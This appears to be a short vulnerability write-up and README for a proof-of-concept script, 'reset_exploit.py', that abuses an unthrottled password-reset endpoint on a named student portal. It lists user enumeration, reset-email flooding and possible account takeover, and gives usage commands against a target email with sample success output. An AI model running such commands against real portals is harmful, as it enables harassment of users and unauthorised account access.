# Password Reset Abuse – CIT Student Portal

**Vulnerability:** The `/forgot/credential/send/link` endpoint allows unlimited PIN reset requests and reveals whether an email exists.

**Impact:**
- User enumeration (valid vs invalid emails).
- Denial of Service (flood users with reset emails).
- Account takeover if the attacker controls the inbox (e.g., dummy email).

**PoC Script:** `reset_exploit.py`

Usage:
```bash
python3 reset_exploit.py target@email.com
python3 reset_exploit.py target@email.com --session SESSION_ID

$ python3 reset_exploit.py anyregisteredmail@gmail.com
[✅] SUCCESS: PIN Reset Link Successfully Sent To Your Registered Email.
